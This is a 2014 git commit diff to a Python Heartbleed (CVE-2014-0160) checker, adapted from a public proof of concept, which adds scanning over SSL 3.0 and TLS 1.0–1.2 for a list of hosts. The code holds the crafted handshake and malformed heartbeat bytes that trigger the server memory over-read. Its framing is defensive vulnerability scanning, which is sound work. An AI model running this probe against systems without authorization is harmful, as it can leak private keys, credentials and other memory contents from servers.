0c2724efe58cf87951c37b719befd62db1657b43
Brodie McRae <brodie.mcrae@telus.com>
2014-04-10 04:01:04 +0000

    added better exception handling and output, plus SSLv3, TLS1.0-1.2

--- README.md
+++ README.md
@@ -1,6 +1,8 @@
 heartbleedchecker
 =================
 
+- Checks SSL 3, TLS 1.0,1.1.,1.2
+
 Iterate through an input file that is a list of hostnames or IPs, 
 and output whether or not they are vulnerable in a greppable format.
 
--- ssltest.py
+++ ssltest.py
@@ -1,11 +1,13 @@
 #!/usr/bin/python
 
+# Scan a target list, on specified ports, for CVE-2014-0160 in various
+# versions of SSL/TLS. Created by Brodie McRae, adapted from original POC by Jared
+# Tries to keep output to one line per host
+
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
 
-# Modified by bjm to more generically check a line-separated target list
-
-# Usage example: python ssltest.py targets.txt
+# Usage example: python ssltest.py targets.txt [port]
 
 import sys
 import struct
@@ -17,31 +19,38 @@ from optparse import OptionParser
 
 options = OptionParser(usage='%prog file [port]', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple hosts, takes a file as an argument')
 
+versions = (['SSL 3.0','03 00'],
+           ['TLS 1.0','03 01'],
+           ['TLS 1.1','03 02'],
+           ['TLS 1.2','03 03'])
+
+timeout = 2  # tcp connection timeout
+
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
 
-hello = h2bin('''
-16 03 02 00  dc 01 00 00 d8 03 02 53
-43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
-bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
-00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
-00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
-c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
-c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
-c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
-c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
-00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
-03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
-00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
-00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
-00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
-00 0f 00 01 01                                  
+def get_hello(ver):
+    hello = h2bin('16 '+ver+' 00 dc 01 00 00 d8 '+ver+'''
+53 43 5b 90 9d 9b 72 0b  bc 0c bc 2b 92 a8 48 97
+cf bd 39 04 cc 16 0a 85  03 90 9f 77 04 33 d4 de
+00 00 66 c0 14 c0 0a c0  22 c0 21 00 39 00 38 00
+88 00 87 c0 0f c0 05 00  35 00 84 c0 12 c0 08 c0
+1c c0 1b 00 16 00 13 c0  0d c0 03 00 0a c0 13 c0
+09 c0 1f c0 1e 00 33 00  32 00 9a 00 99 00 45 00
+44 c0 0e c0 04 00 2f 00  96 00 41 c0 11 c0 07 c0
+0c c0 02 00 05 00 04 00  15 00 12 00 09 00 14 00
+11 00 08 00 06 00 03 00  ff 01 00 00 49 00 0b 00
+04 03 00 01 02 00 0a 00  34 00 32 00 0e 00 0d 00
+19 00 0b 00 0c 00 18 00  09 00 0a 00 16 00 17 00
+08 00 06 00 07 00 14 00  15 00 04 00 05 00 12 00
+13 00 01 00 02 00 03 00  0f 00 10 00 11 00 23 00
+00 00 0f 00 01 01
 ''')
-
-hb = h2bin(''' 
-18 03 02 00 03
-01 40 00
-''')
+    return hello
+ 
+def get_hb(ver):
+    hb = h2bin('18 '+ver+' 00 03 01 40 00')
+    return hb
 
 def hexdump(s):
     for b in xrange(0, len(s), 16):
@@ -82,7 +91,7 @@ def recvmsg(s):
 
     return typ, ver, pay
 
-def hit_hb(s):
+def hit_hb(s,hb):
     s.send(hb)
     while True:
         typ, ver, pay = recvmsg(s)
@@ -101,27 +110,43 @@ def hit_hb(s):
             return False
 
 def is_vulnerable(target, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)
 
-    try:
-        s.connect((target, port))
-    except Exception, e:
-        print "No answer on port %s.." % port,
-        return None
+    for version in versions:
+        print version[0]+"..",
+        sys.stdout.flush()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
 
-    s.send(hello)
-
-    while True:
-        typ, ver, pay = recvmsg(s)
-        if typ == None:
+        try:
+            s.connect((target, port))
+        except socket.timeout, e:
+            print "Timeout.",
             return None
-        # Look for server hello done message.
-        if typ == 22 and ord(pay[0]) == 0x0E:
-            break
+        except socket.error, e:
+            print e[1]+".",
+            return None
+        except Exception, e:
+            print "Exception.",
+            return None
 
-    s.send(hb)
-    return hit_hb(s)
+        s.send(get_hello(version[1]))
+
+        while True:
+            typ, ver, pay = recvmsg(s)
+            if typ == None:
+                print "Conn closed by server.",
+                break
+            # Look for server hello done message.
+            if typ == 22 and ord(pay[0]) == 0x0E:
+                break
+
+        s.send(get_hb(version[1]))
+        vulnerable = hit_hb(s,get_hb(version[1]))
+        s.close()
+        if vulnerable:
+            return vulnerable
+    return False
+
 
 def main():
     opts, args = options.parse_args()
@@ -155,7 +180,7 @@ def main():
         sys.stdout.flush();
         result = is_vulnerable(target, port);
         if result is None:
-            print "No SSL."
+            print "No OpenSSL."
             counter_nossl += 1;
         elif result:
             print "Vulnerable!"
@@ -165,7 +190,7 @@ def main():
             counter_notvuln += 1;
 
     print
-    print "No SSL: " + str(counter_nossl)
+    print "No OpenSSL: " + str(counter_nossl)
     print "Vulnerable: " + str(counter_vuln)
     print "Safe: " + str(counter_notvuln)
 
